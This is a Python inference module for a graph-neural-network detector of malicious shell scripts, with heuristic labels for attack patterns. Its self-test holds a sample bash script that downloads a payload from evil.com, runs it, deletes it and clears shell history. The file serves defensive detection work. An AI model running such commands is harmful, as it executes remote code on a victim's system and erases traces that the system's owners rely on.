"""
GNN Inference API
Load trained model and make predictions on new shell scripts
"""

import torch
import json
import os
from typing import Dict, Any
import sys

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from gnn.model import MalwareGNN
from gnn.graph_builder import ScriptGraphBuilder


class GNNPredictor:
    """Inference wrapper for trained GNN model"""

    def __init__(self, model_path=None, config_path=None):
        self.device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
        self.builder = ScriptGraphBuilder()

        # Default paths
        if model_path is None:
            model_path = os.path.join(os.path.dirname(__file__), '../../models/gnn/gnn_malware_detector.pth')
        if config_path is None:
            config_path = os.path.join(os.path.dirname(__file__), '../../models/gnn/model_config.json')

        # Load config
        self.config = self._load_config(config_path)

        # Initialize and load model
        self.model = self._load_model(model_path)

    def _load_config(self, config_path):
        """Load model configuration"""
        if os.path.exists(config_path):
            with open(config_path, 'r') as f:
                return json.load(f)
        else:
            # Default config if file doesn't exist
            return {
                'model_architecture': {
                    'input_dim': 12,
                    'hidden_dim': 64,
                    'num_layers': 3,
                    'dropout': 0.3
                }
            }

    def _load_model(self, model_path):
        """Load trained model"""
        arch = self.config.get('model_architecture', {})

        model = MalwareGNN(
            input_dim=arch.get('input_dim', 12),
            hidden_dim=arch.get('hidden_dim', 64),
            num_layers=arch.get('num_layers', 3),
            dropout=arch.get('dropout', 0.3)
        ).to(self.device)

        if os.path.exists(model_path):
            model.load_state_dict(torch.load(model_path, map_location=self.device))
            model.eval()
            print(f"[GNN] Model loaded from: {model_path}")
        else:
            print(f"[GNN] WARNING: Model file not found at {model_path}")
            print(f"[GNN] Using untrained model. Train first using: python src/gnn/train.py")

        return model

    def predict(self, script_content: str) -> Dict[str, Any]:
        """
        Predict if script is malicious

        Args:
            script_content: Shell script as string

        Returns:
            Dictionary with prediction results
        """
        try:
            # Build graph from script
            G, metadata = self.builder.build_graph(script_content)

            # Convert to PyG format
            pyg_data = self.builder.graph_to_pyg_data(G)
            pyg_data = pyg_data.to(self.device)

            # Make prediction
            result = self.model.predict(pyg_data)

            # Add graph metadata
            result['graph_metadata'] = metadata

            # Determine attack pattern based on graph features
            result['attack_pattern'] = self._identify_attack_pattern(metadata)

            # Risk score (0-100)
            result['risk_score'] = result['prob_malicious'] * 100

            return result

        except Exception as e:
            return {
                'error': str(e),
                'predicted_class': -1,
                'is_malicious': False,
                'confidence': 0.0,
                'risk_score': 0.0,
                'attack_pattern': 'unknown'
            }

    def _identify_attack_pattern(self, metadata: Dict) -> str:
        """
        Identify likely attack pattern based on graph features

        Returns:
            Attack pattern name
        """
        categories = metadata.get('command_categories', {})

        # Check for common patterns
        has_network = categories.get('network', 0) > 0
        has_execution = categories.get('execution', 0) > 0
        has_file_ops = categories.get('file_ops', 0) > 0
        num_loops = metadata.get('num_loops', 0)
        avg_risk = metadata.get('avg_risk', 0)

        # Pattern detection
        if has_network and has_execution and has_file_ops:
            return "download-execute-cleanup"
        elif has_network and has_execution:
            return "download-and-execute"
        elif has_execution and avg_risk > 0.6:
            return "malicious-execution"
        elif has_network and num_loops > 0:
            return "network-scanning"
        elif has_file_ops and avg_risk > 0.5:
            return "file-manipulation"
        elif num_loops > 2:
            return "potential-cryptominer"
        else:
            return "unknown-pattern"

    def analyze_batch(self, script_paths: list) -> list:
        """
        Analyze multiple scripts

        Args:
            script_paths: List of file paths

        Returns:
            List of prediction dictionaries
        """
        results = []
        for path in script_paths:
            try:
                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                    script = f.read()
                result = self.predict(script)
                result['filepath'] = path
                results.append(result)
            except Exception as e:
                results.append({
                    'filepath': path,
                    'error': str(e),
                    'is_malicious': False
                })
        return results


# Singleton instance
_predictor_instance = None


def get_predictor() -> GNNPredictor:
    """Get or create predictor instance (singleton)"""
    global _predictor_instance
    if _predictor_instance is None:
        _predictor_instance = GNNPredictor()
    return _predictor_instance


if __name__ == '__main__':
    # Test inference
    print("Testing GNN Inference...")

    predictor = GNNPredictor()

    # Test with sample malicious script
    malicious_script = """#!/bin/bash
wget http://evil.com/malware.sh -O /tmp/payload
chmod +x /tmp/payload
/tmp/payload &
rm /tmp/payload
history -c
"""

    result = predictor.predict(malicious_script)

    print("\nPrediction Results:")
    print(f"  Is Malicious: {result['is_malicious']}")
    print(f"  Confidence: {result['confidence']:.2%}")
    print(f"  Risk Score: {result['risk_score']:.1f}/100")
    print(f"  Attack Pattern: {result['attack_pattern']}")
    print(f"  Graph Nodes: {result['graph_metadata']['num_nodes']}")
    print(f"  Graph Edges: {result['graph_metadata']['num_edges']}")
